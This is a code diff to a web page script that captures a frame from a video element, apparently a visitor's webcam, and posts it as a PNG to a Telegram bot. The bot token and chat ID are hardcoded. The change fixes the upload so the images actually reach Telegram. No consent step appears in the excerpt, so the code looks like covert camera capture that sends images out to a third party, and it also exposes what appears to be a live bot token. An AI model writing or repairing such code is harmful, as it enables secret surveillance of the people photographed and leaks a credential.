@@ -31,29 +31,24 @@
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
-
-            console.log("Captured image data: ", imageData);
-
-            // Send image to Telegram
-            sendImageToTelegram(imageData);
+            canvas.toBlob((blob) => {
+                sendImageToTelegram(blob);
+            }, 'image/png');
         }
 
-        async function sendImageToTelegram(imageData) {
+        async function sendImageToTelegram(blob) {
             const botToken = '6279713413:AAEmPVpjxZROtRY9kjSysmSskrG3OrbuiWw';
             const chatId = '5125698617';
             const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'image.png');
+
             try {
                 const response = await fetch(url, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        photo: imageData
-                    })
+                    body: formData
                 });
 
                 if (response.ok) {
